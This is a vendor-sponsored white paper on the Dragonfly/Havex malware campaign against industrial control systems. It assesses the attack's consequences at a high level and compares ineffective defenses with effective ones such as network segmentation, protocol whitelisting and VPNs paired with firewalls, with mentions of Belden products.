Expert RedHatCyber.com Written for Belden Version 3.0 December 10, 2014|\n\n\nTable of Contents\n\n\nPart C – Assessing the\nConsequences.......................................... 21\n\nUnauthorized Code Execution............... 21\n\nInformation Disclosure........................... 22\n\nUnauthorized Remote Access............... 22\n\nUnauthorized Write Access to\nControl Functions.................................... 22\n\nDenial of Service/Loss of View.............. 22\n\nConclusion – Part C................................. 23\n\nBelden’s Cyber Security Expert,\nEric Byres.................................................. 23\n\n\n# White Paper – Part C\n\n### Part C – Assessing the Consequences\n\nThe process of assessing the overall risk that an organization faces from a campaign like\nDragonfly requires careful analysis. It involves not only a thorough understanding of the threats\nand vulnerabilities exploited, but also the consequences to a particular architecture should such\na breach occur.\n\nThe attack sequence conducted by Dragonfly employs “insider” tactics that make this campaign\nvery difficult to prevent and detect. Authorized internal personnel initiated actions in each\nphase of the attack, using components that were obtained from trusted sources and “assumed”\nauthentic. These “insiders” could have been staff at the target companies or third-parties and\nsubcontractors providing maintenance under service level agreements (SLA).\n\nThis campaign may not have impacted your particular organization. However, there are valuable\nlessons that can be learned from the tactics, tools and procedures used by Dragonfly.\n\n**Unauthorized Code Execution**\n\nThere is a widespread problem within industrial systems, and general office systems, which\nallows users to operate in “normal” mode with elevated and even administrative privileges.\nNewer operating systems have provided additional features, like User Account Control (UAC), but\nthese features are not present on operating systems more common within ICS environments.\n\nThe methods used by Dragonfly focused on targeting Windows XP-based computers (more than\n50 percent of the victim’s computers were running Windows XP), and anyone familiar with ICS\nknows how widespread the deployment of Windows XP actually is[20].\n\nThe malware deployed by Dragonfly was unique, and has likely provided a framework for\nfuture attacks. It provided a mechanism to spawn malicious processes and establish persistence\neven though the user was not authorized to perform the initial action (i.e., installing a new\napplication or update).\n\n\n-----\n\nThe cases created to analyze Havex showed\nthat the malware executed as expected (and\nin the case of the OPC scanner, executed\nwith more stability) when launched using\nrestricted accounts (see Part B). This problem\ncould pose significant risk to ICS, since it\neffectively allows any user – be it engineer or\noperator – to initiate potentially damaging\nsoftware on the industrial network.\n\n**Information Disclosure**\n\nThe second phase of the attack focused\non extracting vital system and application\nconfiguration information from the local\nhost and communicating this information\nto the C2 server. Simple commands (such as\n```\nsysteminfo) could be executed providing\n\n```\nvaluable information about the target,\nincluding patch level (or lack of patching\nwhen considering Windows XP systems),\nnetwork access and user information. All\nof this provides valuable reconnaissance\nnecessary for any successful attack.\n\nWhat is of greater concern is the intentional\nexfiltration or theft of sensitive information\nrelating to browser password managers[7],\nVPN configuration information[4], and VPN\ncredentials[4]. This information could then be\nre-used at a later time allowing unauthorized\naccess to critical systems, such as remote\nmachines, PLC and even entire ICS.\n\n**Unauthorized Remote Access**\n\nRemote access is still considered one of the\ngreatest risks to ICS, and even with multifactor authentication (as in the case of\nthese VPNs), may not provide the level of\nprotection that many expect.\n\nThis particular set of malware was designed\nto enumerate systems that would be at the\n“remote” end of an established VPN tunnel.\nThe two primary attack vectors (via trojanized\nsoftware) using the eWON and MB Connect\nLine software leveraged the fact that both\napplications would typically be deployed at\nthe remote side of the connection. These\napplications could also target supplychain vulnerabilities, as it is very likely that\n\n\nOEMs and suppliers used them as part of\nmaintenance agreements and SLAs.\n\neWON claims to have over one million\nremote connections globally. This means\nthat a single compromise of a supplier or\nOEM could indirectly impact multiple end\nusers who depend on these organizations for\nremote support. Once these remote systems\nare connected, it is probable that they are\ndirectly connected to ICS networks. Without\nadditional security measures, there is little\nthat can be done to restrict the impact of\nthese infected remote clients.\n\n**Unauthorized Write Access to Control**\n**Functions**\n\nThe OPC module used by Dragonfly only\nincluded calls to the OpcEnum enumeration\nservice that allows the module to scan\nlocal and remote OPC servers. Anyone\nfamiliar with OPC realizes that the primary\nmotivation for the OPC enumeration feature\nwas to make data integration simpler for\nthe plant engineer. One way to accomplish\nthis is to provide automatic enumeration\nof servers and the points residing in these\nservers by offering a sort of “auto discovery”\nfor authorized users. It is this ease-of-use\nfeature that the Havex OPC module used in\nperforming its scanning functions.\n\nThe problem is that without taking additional\nsecurity measures, Havex-infected users\nmay also be able to connect to OPC servers\nand perform unintentional actions, such as\nwriting new values to the process database.\nThe Havex OPC module did not include these\ncapabilities, but given the proof-of-concept\ncode that is now available, it would be a\ntrivial task for the attackers to extend the\nfunctionality of the Havex OPC module to\ninclude other, more destructive, OPC calls.\n\n**Denial of Service/Loss of View**\n\nAny impact to running processes on ICS hosts\ncan lead to denial of service events that may\ninclude complete loss of view or control\nof real-time data. Many of the processes\nrunning in ICS hosts are designed for real\n\ntime control functions, and have been tuned\nto match other installed components in order\nto guarantee high levels of performance and\navailability. This is the reason many vendors\nhave restrictions on the optional software\nthat can be installed on these hosts.\n\nDuring our experimentation, we noted\nprocess instability occurred when certain\nHavex modules were executed on ICS hosts.\nMany of these problems caused vital services\nto crash (such as Windows Explorer) rendering\nthe host useless. The only solution was to\nreboot the host. Unfortunately, Havex created\npersistence so that after the system rebooted,\nthe malware resumed execution and the\nproblem repeated itself.\n\nThe evaluation of the trojanized software\ntargeted by Dragonfly implies that it is highly\nunlikely that the software installation would\nhave occurred on a critical ICS host. Havex\ndid not possess any capabilities to replicate\nitself, so there was little chance of infecting\nan ICS via a remote VPN connection.\n\nHowever, there may be cases where the\nremote end of the VPN connection is\nnecessary to provide OPC connectivity to the\nICS (the primary function of the MB Connect\nLine eFive solution). In such cases, system\ncrashes and reboots could have negatively\nimpacted operations.\n\n\n-----\n\n## Be Certain with Belden\n\n### Conclusion – Part C\n\nThe Dragonfly malware did not directly impact the performance of ICS systems and did not install itself on mission-critical ICS hosts. Its potential\ndamage was to steal valuable information. This could include the theft of proprietary recipes and production batch sequence steps, as well as network\nand device information that indicate manufacturing plant volumes and capabilities.\n\nThe consequences of the Dragonfly campaign were:\n\n- It allowed malicious code to be executed on the systems of users not authorized to do things such as install or update applications.\n\n- It established persistence on internal user systems.\n\n- It focused on targeting computers running Windows XP.\n\n- It resulted in any user – be it engineer or operator – being able to initiate potentially damaging software on the industrial system.\n\n- It extracted sensitive information, such as passwords, that could be re-used at a later time allowing unauthorized access to critical systems.\n\n- It allowed unauthorized remote access providing suppliers or maintenance groups a pathway to control systems.\n\n- It demonstrated a proof-of-concept for providing unauthorized write access to control functions, in this case using the OPC protocol.\n\n- It could cause Denial of Service or Loss of View of control systems by infecting the remote end of a VPN connection and causing system crashes\n\nor reboots.\n\n### Belden’s Cyber Security Expert, Eric Byres\n\nEric Byres, CTO of Tofino Security, a Belden Brand, and a world authority on industrial cyber security made these remarks about Dragonfly:\n\n“While Dragonfly’s creators appear to have intended this attack to be non-destructive and for intellectual property theft only, it is clear that the\nmalware design makes it potentially far more dangerous to live process control operations.”\n\n“At some point, should they wish it to be a destructive attack, it will be trivial for them to modify the downloaded modules and seriously impact\ntheir victims’ operations. Since we don’t know the Dragonfly team’s motives, any company facing an attack like this must assume the worst-case\nscenario in their risk analysis and proceed accordingly.”\n\n\n-----\n\nThis page intentionally left blank\n\n\n-----\n\n|Col1|Col2|\n|---|---|\n||Defending Against the Dragonfly Cyber Security Attacks Part D – Defending Industrial Control Systems Joel T. Langill ICS Cyber Security Expert RedHatCyber.com Written for Belden Version 3.0 December 10, 2014|\n\n\nTable of Contents\n\n\nPart D – Defending Industrial\nControl Systems....................................... 25\n\nIneffective Defenses for Dragonfly....... 25\n\nApplication Whitelisting.................. 25\n\nApplication Blacklisting................... 26\n\nRestricted User Accounts............... 26\n\nHost-Based Firewalls....................... 26\n\nVPNs.................................................... 26\n\nPatch Management.......................... 27\n\nEffective Defenses for Dragonfly.......... 27\n\nProcurement Standards for ICS\nComponents...................................... 27\n\nSecurity Assurance Using\nISA/IEC 62443................................... 27\n\nNetwork Segmentation.................... 28\n\nNetwork Whitelisting........................ 29\n\nProtocol Whitelisting........................ 29\n\nEmail Domain Blacklisting.............. 30\n\nVPNs with DPI/Stateful\nFirewalls............................................. 30\n\nConclusion – Part D................................. 30\n\nBelden’s Cyber Security Expert,\nEric Byres.................................................. 31\n\n\n# White Paper – Part D\n\n### Part D - Defending Industrial Control Systems\n\nOne of the more valuable pieces of information that one could obtain when reviewing\ncampaigns such as Dragonfly is an assessment of those security controls that would have\nprovided the greatest level of protection from the event(s) leading to harmful impact.\n\nIn addition, it is also useful to identify those defenses that are typically deployed in ICS security\nand evaluate their risk reduction potential against this particular threat. In doing so, this will\nprovide valuable feedback for industrial security programs. Such programs require constant\nreview and adjustment (if needed) of their security controls, particularly within critical industrial\nenvironments.\n\n**Ineffective Defenses for Dragonfly**\n\nNo one wants to hear what would NOT have worked to stop Havex. Others will make claims\nthat their solutions would have defeated the campaign immediately – after all, hindsight is\nalways 20/20. This section may suggest controversial ideas, but it is important that the industry\nre-evaluate all security assumptions in light of Dragonfly and the lessons learned from this\naggressive and sophisticated campaign.\n\n**Application Whitelisting**\n\nOne of the most “demanded” technical controls suggested as a solution for today’s sophisticated\nthreat actors is the use of application whitelisting (AWL). These products vary greatly from\nvendor to vendor, offering different levels of support for file-based and memory-based\nattacks. In general though, AWL can offer good protection from new malicious software being\nintroduced to an operational system.\n\nUnfortunately, Dragonfly highlights the Achilles heel of AWL technology. How do AWL solutions\noffer protection during software updates when both the file system and memory are being\ndeliberately modified by the end-user?\n\n\n-----\n\nA core reason that Dragonfly was successful\nis that the trojanized software was obtained\nfrom credible and trusted sources (ICS\nsecurity vendors). Furthermore, the lack of\nany signature from the vendors made it\ndifficult for users to validate the integrity of\nthe software before they installed it.\n\nOnce the user made the decision to install\nthe software, AWL would have been of little\nuse, since many leading AWL products require\nthe service to be disabled or bypassed during\nsoftware installation. The few minutes the\nAWL software is turned off is all that is\nnecessary to introduce the malware into the\nsystem.\n\n**Application Blacklisting**\n\nThis “window of opportunity” for malware\nis one of the leading reasons many security\nadvocates also recommend using traditional,\nsignature and anomaly-based anti-virus (AV)\nor “blacklisting” applications in ICS. The idea\nis not only to provide Defense in Depth when\nboth technologies are operational, but also to\nprevent one from “lowering their shields” at\nany point in the software lifecycle.\n\nUnfortunately, a review of leading AV\nsuppliers showed that many did not release\nsignatures for Havex until mid-2014. Clearly,\nthis provided little protection for those that\ninstalled the malicious “legitimate” software\nbefore signatures were made available.\n\n**Restricted User Accounts**\n\nProbably one of the most eye-opening\nobservations from this research was how\nthe malware could execute using user\naccounts configured to have restricted\nlevels of authorization. This is not to say\nthat restricted accounts should no longer\nbe used, but adds to the justification for a\nsolid Defense in Depth approach that must\nconsider how a threat would propagate\nwithin a target when a key security control is\nnot performing as intended.\n\nRestricted accounts are one of several widely\ntrusted and deployed controls that are\nproving to be ineffective against this type of\n\n\ntargeted threat. Use of these controls must\nnow also include an understanding of the\nrisks to the system (and counter measures)\nshould they fail to perform their intended\nsecurity functions.\n\n**Host-Based Firewalls**\n\nThe use of host-based firewalls, like the\nWindows Firewall, is an important part\nin securing any host. The problem with\nthe Havex malware is that the (Windows\nXP) firewall would not have provided any\nprotection since the services being run are\nfrom authorized sources.\n\nIn other words, the malware is executing local\nservices that have been properly installed, and\nthus, the firewall would have automatically\nbeen configured to allow the network access\nneeded by the malware to perform its deeds.\n\n**Virtual Private Networks (VPNs)**\n\nIt might seem strange to see VPNs listed in\nthe “Ineffective Against Dragonfly” category.\nAfter all, most experts agree that VPNs\ndo an exceptional job of protecting the\nconfidentiality, integrity and availability of\nthe communication session from “external”\nor Internet-based threats. Unfortunately, VPN\ntechnology, as it is often deployed in industry,\nhas limitations.\n\nThe problem with VPN technology is that\nit does little in terms of controlling what\n“enters” the VPN tunnel and, thus, shows\nup on the opposite end. Once the endpoints\nare authenticated, a VPN lets all traffic from\nthe authenticated host through. It does not\nmonitor or filter any of the traffic that passes\nthrough it.\n\nThis means that if you connect a virusinfected PC to your control network through\na VPN, the VPN will not prevent the virus\nfrom passing right through the tunnel and\ninfecting PCs on the other end. Dragonfly’s\nmalware was deliberately designed to be\ninstalled on a computer on the remote side\nof a VPN, and then exploit this trusted and\nauthenticated connection to enumerate\nservices running on the target ICS.\n\n\nThus, in order to provide effective security,\nany remote access VPN must be combined\nwith other security measures, such as a\nfirewall, that manages what enters or leaves\nthe VPN tunnel. Unfortunately, many of the\n“light” or “industrial” remote access solutions\ndo not support the ability to restrict endpoint\ntraffic through the VPN. This leaves the asset\nowner two choices:\n\n1. Replace the VPN-only solution with a\n\nproduct offering an integrated VPN and\nstateful firewall technology. This will make\nit possible to specify the IP addresses\nand TCP/UDP destination ports of traffic\nallowed in each VPN tunnel. Examples\nof such industrial VPN/firewalls are the\nHirschmann Industrial Security Router and\nthe Hirschmann Multi-Port Firewall. (Links\nto more information on Belden products\nare available at the end of this paper.)\n\n2. Add a transparent Deep Packet Inspection\n\n(DPI) firewall (explained in the upcoming\nsection “Protocol Whitelisting”) between\nthe ICS VPN node and the actual ICS\n[network. For example, the Tofino EtherNet/](http://www.belden.com/products/industrialnetworking/routers/upload/TofinoEtherNetIPEnforcerLSM_PB1090.pdf)\n[IP Enforcer could be configured to restrict](http://www.belden.com/products/industrialnetworking/routers/upload/TofinoEtherNetIPEnforcerLSM_PB1090.pdf)\nthe EtherNet/IP messages leaving the VPN\nconnection and entering the ICS network\nto just data read services on a small set of\ndevices.\n\nIn the Dragonfly case, this would not\n\nhave prevented the infected host from\nquerying the ICS devices it was normally\nallowed to query, but it would have limited\nDragonfly’s reconnaissance of entire ICS\nsystems. It also would have prevented\nthe attackers from deploying destructive\nattacks in the future.\n\nSimilarly, the use of the Tofino OPC Classic\n\nEnforcer downstream of the VPN would\nhave restricted the ability of the malware’s\nOPC enumeration module to scan the\nentire network, allowing it to see only a\nfew hosts the remote engineer would have\nbeen officially allowed to access.\n\nIt is important to stress that even these\nsolutions do not provide perfect security.\nDepending on what the asset owner’s reasons\nfor creating a remote access system were,\n\n\n-----\n\n## Be Certain with Belden\n\nHavex might have been exploiting services\nthat would have been allowed in the VPN and\nthrough the firewalls.\n\nFor example, consider the case where a\nstateful packet-filtering firewall was used\n(option #1) and a rule was defined to open\nport 44818/tcp for EtherNet/IP traffic. Even\nwith this protection, Havex may have been\nable to perform its industrial protocol scan\nagainst a set of targets.\n\nLikewise, consider the case where a DPI\nfirewall was used (option #2). Havex would\nstill have been able to scan the OPC server\nthat was on the “inside” of the tunnel,\nassuming that this server was intended to be\naccessed over the VPN.\n\nWhat both of the firewall solutions do offer\nis the ability to constrain the malware to\na small set of “approved” targets, rather\nthan the entire plant. They also potentially\nlimit the impact of the malware on the few\nexposed computers. This is a significant step\ntowards the containment and mitigation of\nsophisticated cyber attacks like Dragonfly.\n\nThe lesson to be learned is that it is\nimportant to have security controls that are\nindependent of the remote access computer.\nThese must be able to secure the operation\nof the ICS even if a trusted remote host has\nbeen completely comprised, as it was in the\ncase of the Dragonfly attacks.\n\n**Patch Management**\n\nPatch management is an important security\ncontrol[21], although it typically is not the most\neffective control when considering attack\nscenarios like those used by Dragonfly. Sadly,\nmany of the victims installed the infected\nsoftware as a direct result of their desire to\nbe updating software that they currently\nhad running in their control system. They\nbelieved that they had to remain current if\nthey expected to be protected against cyber\nattacks. Heartbleed[22] has shown the industry\nthat in certain cases, new software can be\nmore vulnerable than the software that it is\ndesigned to replace.\n\n\nIn summary, there are strong advantages\nto having a rigorous patch management\nprogram in place. However, consideration\nshould always be given to ensuring the\nhighest levels of authenticity and the\npotential impact to manufacturing operations\nwhen updating ICS software.\n\n**Effective Defenses for Dragonfly**\n\nThis section describes those defenses that\nwould have best protected a control system\nfrom the Dragonfly campaign. It is worth\nnoting that while this paper is sponsored by\nBelden, it was written by an independent\nconsultant. Certainly, several of the most\neffective defenses that can be used to protect\nagainst Havex and similar attacks will be\naligned with Belden products. In some cases,\nthere are limited options available, and\nin others, several suppliers could provide\nsimilar solutions. The idea is not to endorse\nany particular product, but rather to take\nindustrial solutions and apply them directly\nto a problem resulting in a more secure ICS\nenvironment.\n\n**Procurement Standards for ICS Components**\n\nThe use of the supply-chain to initiate a cyber\nattack is not something new; it is likely that\nStuxnet’s designers also used this as part of\ntheir victim penetration strategy. What this\ncampaign highlights is that it continues to\nprove to be a highly successful vector that\ncan result in significant impact.\n\nThe other point this campaign highlights is\nthat small players in the supply chain can\nbe the source of significant risk. Potential\nattackers will always attempt to exploit the\nweakest part of the overall ICS lifecycle.\nIt makes sense for them to attack a small\nsupplier that offers valuable components\nto a wide range of end users. This will\nlikely prove easier than trying to directly\npenetrate the ICS environment of a multinational corporation with a sophisticated IT\ndepartment supporting tens of thousands of\nemployees. Dragonfly is a perfect example of\nthis; the suppliers that were infected typically\nhad less than 50 employees.\n\n\nThe lesson learned is not to change the way a\nsupply chain delivers valued-added solutions,\nbut rather to understand the risk introduced\ninto the industrial environment through\nthe use of these companies and products.\nFortunately, ICSCERT publishes a document\ncalled “Cyber Security Procurement Language\n_for Control Systems[23],” which provides_\nvaluable information that can be used to\nunderstand both product capabilities and\ncompany practices as they relate to industrial\nsecurity.\n\nAn example from the document that is very\nrelevant to Havex outlines the use of VPNs\nin ICS. Here, the document discusses the use\nof semi-trusted demilitarized zones for VPN\nlanding, and how vital information (such as\npasswords) should be protected in storage\nand in transit.\n\nThe document also discusses security related\nto web-based interfaces (common on many\nVPN appliances), as well as requirements for\ninternal coding practices used by suppliers.\nOther topics include precautions that should\nbe considered at the security perimeter,\nincluding additional measures beyond simple\nstateful firewalls (such as intrusion detection\nsystems). These defensive techniques may\nnot add a lot of security to an existing\ncontrol system, but can provide significant\nimprovements to the security of future\nsystems and system enhancements.\n\n**Security Assurance Using ISA/IEC 62443**\n\nThe industrial automation and control sector\nis vast, with a range of suppliers globally\nproviding products to improve efficiency,\nreduce operating cost, and oftentimes\nimprove security. But not all security\nofferings are equal. For example, encryption\noffers security, so is IEEE802.11’s old Wireless\nEncryption Protocol (WEP) secure? Of course\nnot – WEP has been widely shown to be\ncrackable in under an hour.\n\nFor this reason, the International Society of\nAutomation (ISA) has a suite of standards,\nISA/IEC 62443[24], for industrial automation\nand control system security. They encompass\n\n\n-----\n\n**Figure 8: ICS Reference Architecture – Zones and Conduits (source: isa.org)**\n\n\nstandards devoted to component-level security\nin terms of both product development and\ndelivered security capabilities. These documents\n(ISA 62443-4-1 and ISA 62443-4-2) are being\ndeveloped to offer a consistent mechanism for\nrepresenting the security “capability” of ICS\ncomponents.\n\nTo facilitate compliance with these standards,\nthe ISA Security Compliance Institute (ISCI)\noffers certifications[25] that can be used to\ndemonstrate a particular component meets the\nrequirements set within these standards.\n\n- The Security Development Lifecycle\n\nAssurance (SDLA) is a certification\nprogram that assesses a supplier’s product\ndevelopment lifecycle processes for ICS.\n\n- The Embedded Device Security Assurance\n\n(EDSA) certification focuses on the security\nof embedded devices, and addresses device\ncharacteristics and supplier development\npractices for those devices.\n\nThe use of these standards and certifications\n\n\nis a vital part in ensuring the security level\nrequired for those devices performing critical\nfunctions within the ICS architecture.\n\n**Network Segmentation**\n\nNot a single advisory or alert is issued from\nICSCERT that does not begin the threat\nmitigation steps with the importance of\nnetwork segmentation. Leading international\nstandards, like ISO2700x and ISA/IEC 62443,\nstress the importance of restricting network\ntraffic to those security “zones” that require the\ntraffic. Security controls can then be enforced\non the communication links or “conduits” that\nexist between these zones. What exactly does\nthis mean?\n\nConsider a typical ICS architecture that consists\nof basic control devices (PLCs, SIS, RTUs)\nconnected to servers (SCADA, DCS) and humanmachine interfaces (HMIs). These systems are\noften connected to supervisory applications,\nlike historians, batch management, asset\nmanagement, condition monitoring, etc.\n\n\nA diagram from ISA/IEC 62443 illustrates this\nin Figure 8. The zones are shown as the four\nmajor network areas (Enterprise Network,\nIndustrial/Enterprise DMZ, Industrial Network\n#1 and Industrial Network #2). The conduits\nbetween the zones are shown as the green\nconnections linking zones.\n\nThe basic premise behind segmentation is the\nlimitation of network traffic to particular\nzones and networks. In other words, if an\nindustrial protocol, such as EtherNet/IP, is\nonly used on “Industrial Network #1,” then\nappropriate controls should be used to prevent\nthis traffic from traversing across the boundary\nor “conduit” to other zones. Similarly, protocols\nthat often exist on supervisory networks (such\nas HTTP) should not be allowed to enter the\nlower- and upper-level industrial networks.\n\nIn the case of Havex, if OPC connectivity\nusing MS-DCOM/RPC mechanisms is required\nthrough a VPN, it effectively places the remote\nhost on the same network as the OPC server.\nIn this case, proper segmentation should be\ndeployed to isolate this traffic (now originating\nfrom a foreign source) from more critical\ncontrol traffic in other zones.\n\nThis type of architecture is easily deployed\nusing an appropriate mix of managed\nruggedized switches, such as the Hirschmann\nRSP and MSP product lines. They are designed\nto support industrial protocols, like EtherNet/IP\nand PROFINET.\n\nHirschmann managed switches also provide\nmachine-level switch capability and\nsegmentation. They can be aggregated via\nhigh-performance workgroup switches, such\nas the Hirschmann MACH100 line, providing\naccess control capabilities between the zones\nand subzones.\n\nAdditional enforcement of security policies\nbetween zones interconnected using managed\nswitches can be implemented with industrial\nfirewall products, such as the Tofino Industrial\nNetwork Security Appliance and Hirschmann\nIndustrial Security Router (see Network\nWhitelisting).\n\n\n-----\n\n## Be Certain with Belden\n\n**Network Whitelisting**\n\nNetwork whitelisting is a term that is not\nwidely used, but is similar in concept to\napplication whitelisting. The concept is to\nonly allow a device or computer to place\nauthorized traffic onto the network. This\nwhitelisting can be enforced at two levels on\na given network, depending on the level of\nprotection desired.\n\nThe first method was introduced by the\nAustralian Department of Defense in\ntheir document “Strategies to Mitigate\n_Target Cyber Intrusions[26],” and focuses on_\nconfiguring host-based (Windows) firewall\negress rules to limit a given host’s network\nexposure. This means that if a host is\ndesigned to only use a small range of TCP\nport numbers (for example: 139, 445, 44818),\nthen only these ports should be allowed\nand all others blocked. This is a simple\nenforcement of a “least privileges” model.\n\nThe problem with this approach is that if the\nattacker has compromised a host, then it\n\n**Figure 9: OPC Server Whitelisting Example**\n\n\nshould be assumed that they have the ability\nto disable or modify the host-based firewall\nand open up network access. For this reason,\nit is encouraged to provide this network\nwhitelisting external to any host that might\nbe an attack entry point.\n\nThis can be done using an industrial\ntransparent or bridged firewall, like the\nHirschmann Industrial Security Router or\nTofino Industrial Network Security Appliance.\nThese provide significant resilience to cyber\nevents not only in terms of the traffic that\nis permitted on the network, but also the\ndestination of all traffic originating at a\nparticular host.\n\nSome engineers view this as excessive if\ndeployed on any industrial network of\nreasonable size. The point is not necessarily\nto deploy this at the lowest levels of the\nnetwork, but rather to deploy it at the\nperimeter of critical security zones, like\nremote entry points into the network that\ncould possibly originate via VPNs and remote\nhosts.\n\n\n**Protocol Whitelisting**\n\nAs the sophistication of the attacks\nincrease, so must the security defenses\nthat are deployed. Havex showed how\nonce malware was released on a particular\ntrusted target, that the compromised\nmachine could now provide any function\nthat it had been previously authorized\nfor (install new software, change device\nconfiguration, shutdown/reboot nodes, etc.).\nExternal network whitelisting will only block\nunauthorized applications (services) from\nentering the network. It does not provide\nthe ability to limit the functions that each of\nthese applications can perform.\n\nThis requires the ability to filter based not\nonly on the transports used, but also the\napplication content. Deployed on a network,\nthis is commonly referred to as Deep Packet\nInspection[27] (DPI), and it provides the ability\nto restrict specific application content from\nentering the network.\n\nFor example, a controls engineer may use\nDPI to not allow HTTP POST requests on\na control network or to limit EtherNet/IP\nfunctions to read-only services to a critical\nPLC. This requires a device that can not\nonly be installed in industrial environments,\nbut also has application awareness of the\nindustrial protocols used.\n\nSuch devices are typically deployed close to\nthe device(s) they are protecting. When they\nare used to protect one or more industrial\nembedded devices, like safety PLCs, they\nneed to be rated for the same environmental\nconditions as the PLC. This is often very\ndifferent from the conditions required for\nWindows-based hosts.\n\nThe Tofino Industrial Network Security\nAppliance is specifically designed to provide\nthis capability, and supports a wide range of\nindustrial protocols. It has the ability to limit\nnot only function codes (read-only, readwrite, no programming, etc.), but also the\ndevice registers or objects accessed over the\nnetwork.\n\n\n-----\n\nThe number of devices that provide this\ncapability for OPC data access functions\nis limited. In this case, it is important\nto implement proper server security\non all OPC devices. Many leading OPC\napplications provide the ability to restrict the\nfunctionality and extent of access to a given\nOPC server based on username. This could be\nused to provide full browse and read-write\naccess to local users, but limit remote users to\njust browse and read-only capabilities. Figure\n9 shows these settings for a MatrikonOPC\nServer.\n\n**Email Domain Blacklisting**\n\nMultiple cyber event reports acknowledge\nthat targeted attacks initiated using spear\nphishing techniques are often highly\nsuccessful. However, there are simple\n\n### Conclusion – Part D\n\n\nmechanisms that can be deployed at the\nbusiness security perimeter that are often\nneglected.\n\nThe early phase of the Dragonfly campaign\nconsisted of a targeted spear phishing[8] attack\nthat sent malicious emails from a free email\naccount (Gmail, Yahoo, Hotmail, MSN, etc.).\nMost business practices clearly restrict the\nuse of company assets for direct work-related\nfunctions, yet few deploy security controls to\nenforce these policies.\n\nIn today’s interconnected society, there is\nno reason for business communications to\nuse these insecure channels. Overall security\nresiliency will improve when all addresses\nfrom these sources (not just those email\naddresses that are blacklisted) are blocked\nfrom entering business networks.\n\n\n**VPNs with DPI/Stateful Firewalls**\n\nAs mentioned earlier, VPNs do an exceptional\njob of protecting the confidentiality, integrity\nand availability of communication sessions\nfrom “external” or Internet-based threats.\nHowever, their cyber protection usefulness\nis limited because they do not control what\n“enters” the VPN tunnel or the destination of\ntraffic leaving the tunnel.\n\nThis limitation is overcome when VPNs are\nused in combination with:\n\n- DPI technology to restrict the content/\n\npayload of traffic entering the VPN\ntunnels.\n\n- Stateful firewalls to specify allowed IP\n\naddresses and TCP/UDP destination ports of\ntraffic.\n\n\nThe Dragonfly malware campaign was sophisticated and its “insider” tactics made it difficult to both detect and prevent. Here are the cyber defenses\nthat, while useful in many IT situations, would NOT have defended against this campaign:\n\n\n**The Defense** **Why Ineffective Against Dragonfly**\n\n\nApplication Whitelisting - Variations in how AWL vendors handle authorized software updates and disabling of protection could make hosts vulnerable during upgrade processes\n\n               - Lack of ICS vendors providing measures to guarantee software “authenticity” could provide a window of attack\n\n               - Installation of malware in a legitimate directory used for program read/write stores could reduce effectiveness of AWL\n\n               - Difficult to detect malware that executes legitimate procedure calls on authorized processes\n\n\nApplication Blacklisting\n(anti-virus or AV)\n\n\n\n- Lack of AV signatures for detecting the malware during its peak period of activity\n\n- Standard software procedures typically suggest disabling AV during software installation, which provides a window of opportunity for infection\n\n\nRestricted User Accounts - Malware installation, registry modifications, and persistence was possible from user accounts with limited local authorization rights\n\n                - Malware instability when executing with administrative level user accounts caused system instability and potential denial-of-service\n\nHost-Based Firewalls - Dragonfly utilized authorized services to perform unauthorized network calls, which would have been granted via approved firewall rule sets\n\n                - Limited functionality of the Windows XP[20] firewall to control introduction of unauthorized network traffic\n\nVPNs - Many VPNs do not adequately control what enters/leaves the tunnel via authorized endpoints\n\n                - VPN encryption can hide malicious software from other security and inspection controls\n\n                - Useful when combined with additional technology to restrict endpoint access and prevent malware from achieving “full” visibility of the ICS network\n\nPatch Management - Installation of software on working systems may introduce new weaknesses\n\n                - Few mechanisms in place to ensure the authenticity of ICS supplier software prior to installation\n\n**Table 7: Ineffective Defenses for Dragonfly**\n\n\n-----\n\n## Be Certain with Belden\n\nDespite the challenges of defending against Dragonfly, the use of up-to-date best practice policies and industrially focused security technologies\ncan provide protection. Here are the cyber defenses that WOULD have defended against this campaign:\n\n\n**The Defense** **Why Effective Against Dragonfly**\n\n\nProcurement Standards for\nICS Components\n\nUtilization of ISA/IEC 62443\nSupplier and Product\nAssurance Practices\n\nUtilization of ISA/IEC 62443\nZones and Conduits Best\nPractices\n\nNetwork Whitelisting Using a\nTransparent Firewall\n\nProtocol Whitelisting\n“Deep Packet Inspection”\n\nVPNs with Restricted Visibility\nof ICS Assets\n\n\n\n- Specifies the use of semi-trusted “demilitarized” zone for remote access to trusted industrial networks\n\n- Stipulates the protection of vital information, like passwords, in storage and transit\n\n- Requires vendor software development lifecycle evaluation and internal coding practices in the case of open-source and third-party software\n\n- Indicates strengthening external security perimeters with firewalls and intrusion detection systems - especially when using remote access solutions\n\n- Software development, hardware and integration guidelines identify and mitigate common security weaknesses\n\n- Provides identification and utilization of solutions that possess sufficient security “capability” for the desired application\n\n- Creation of security zones and restriction of unnecessary network traffic in the conduits between these zones\n\n- Limiting non-control traffic, such as OPC, to only pre-authorized zones\n\n- Preventing control traffic, such as Modbus/TCP and EtherNet/IP, from entering non-control zones\n\n- Contain harmful network traffic (such as traffic that may enter through a VPN) to a particular zone, thereby protecting the control operations\n\n- Distributed architecture of workgroup or cell-based switches with area-wide switches capable of at least access control\n\n- Limits the traffic that is permitted on a network and the destination of any traffic originating from a particular host\n\n- Use at remote entry points to a network, such as VPNs and critical control zones\n\n- Enforces restricted ingress of traffic into critical zones from other network hosts\n\n- Filters traffic not just by protocol used, but also on the application content\n\n- Restricts specific application content from entering the network\n\n- Located near the devices they are protecting and need the same industrial hardening as those devices\n\n- Use of semi-trusted demilitarized zones for VPN landing into ICS\n\n- Detailed filtering of VPN egress traffic so that only non-critical assets can be remotely viewed\n\n- Combination of DPI technology with VPNs to restrict contents/payload of traffic allowed into the VPN tunnel\n\n\nEmail Domain Blacklisting - Blocks email spear phishing attacks from free email accounts\n\n**Table 8: Effective Defenses for Dragonfly**\n\n### Belden’s Cyber Security Expert, Eric Byres\n\n\nEric Byres, CTO of Tofino Security, a Belden\nBrand, and a world authority on industrial\ncyber security made these remarks about\nDragonfly:\n\n“If Dragonfly has taught us anything,\nit is that when defending ICS systems\nfrom today’s sophisticated attackers, the\n‘usual’ security solutions may not be the\n\n\nright security solutions. Technologies and\nprocedures like Restricted User Accounts,\nPatching and VPNs actually played into the\nattackers hands.”\n\n“Instead of deploying security policies\nbecause ‘everyone does it this way’ or the\n‘check list tells us to,’ ICS security needs to\nbe evaluated on a holistic risk basis. And in\n\n\nthat analysis, we have to assume that the\nbad guys will breach our defenses at some\npoint. Preventing breaches is desirable, but\nbeing able to detect and address a breach\nrapidly and effectively will prove to be a\nmore important capability for every industrial\ncompany in the next few years.”\n\n\n-----\n\n### 